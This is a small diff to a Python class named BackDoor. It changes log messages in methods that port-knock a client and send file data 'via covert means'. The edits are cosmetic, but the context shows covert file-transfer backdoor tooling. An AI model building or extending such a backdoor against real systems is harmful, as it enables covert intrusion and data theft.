@@ -223,7 +223,7 @@ class BackDoor:
         """Begins the process of opening client port
         and sending file via covert means
         """
-        print("Knocking")
+        print("Sending Knock Sequence")
         self.port_knock()
         # Give time for client to open ports
         time.sleep(0.5)
@@ -238,6 +238,8 @@ class BackDoor:
         filename = ""
         if path:
             filename = path.split("/")[-1]
+            print(f"Sending file: {filename}")
+            print("--------------------------------------------------")
             binary_data = self.get_file_bin(path)
         else:
             binary_data = self.get_bin(data)
